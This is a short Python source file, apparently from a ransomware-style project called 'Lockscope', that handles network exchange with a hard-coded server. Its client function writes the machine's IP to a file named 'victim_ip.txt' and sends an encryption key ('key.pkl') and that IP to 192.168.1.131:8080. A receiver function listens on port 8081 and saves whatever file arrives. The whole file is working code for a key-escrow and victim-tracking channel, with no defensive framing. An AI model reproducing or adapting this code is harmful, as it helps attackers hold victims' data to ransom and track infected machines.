import socket
import time
import os


def client(key):
    
    IP = '192.168.1.131'
    PORT = 8080
    ADDR = (IP, PORT)

    machine_ip = socket.gethostbyname(socket.gethostname())

    with open(r"C:\Users\User\Desktop\Lockscope\Fase 3\victim_ip.txt", "wb") as f:
        f.write(machine_ip.encode())

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(ADDR)

   
    client.send("key.pkl".encode())
    time.sleep(2)
    client.send(key)

    time.sleep(2)

    with open(r"C:\Users\User\Desktop\Lockscope\Fase 3\victim_ip.txt", "rb") as f:
        victim_ip = f.read()
        client.send("victim_ip.txt".encode())
        time.sleep(2)
        client.send(victim_ip)

    client.close()


def receiver():

    IP = socket.gethostbyname(socket.gethostname())
    PORT = 8081
    ADDR = (IP, PORT)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.bind(ADDR)
    client.listen()

    conn, addr = client.accept()
    filename = conn.recv(1024).decode()

    path = os.path.join(r"C:\Users\User\Desktop\Lockscope\Fase 3", filename)
    with open(path, "wb") as f:
        data = conn.recv(1024)
        f.write(data)

    conn.close()

if __name__ == '__main__':
    #client()
    receiver()